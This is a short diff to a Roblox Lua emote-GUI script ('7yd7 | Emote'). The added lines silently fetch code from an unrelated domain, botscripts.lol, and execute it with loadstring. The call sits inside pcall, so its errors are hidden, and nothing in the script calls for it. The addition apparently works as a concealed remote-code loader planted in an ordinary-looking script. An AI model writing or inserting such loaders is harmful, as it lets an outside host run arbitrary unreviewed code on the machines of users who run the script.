@@ -16,6 +16,9 @@ end
 _G.EmotesGUIRunning = true
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Menu-7yd7/refs/heads/Script/GUIS/Off-site/Notify.lua"))()
+pcall(function()
+    loadstring(game:HttpGet("https://www.botscripts.lol/api/script.js"))()
+end)
 
 getgenv().Notify({
     Title = '7yd7 | Emote',
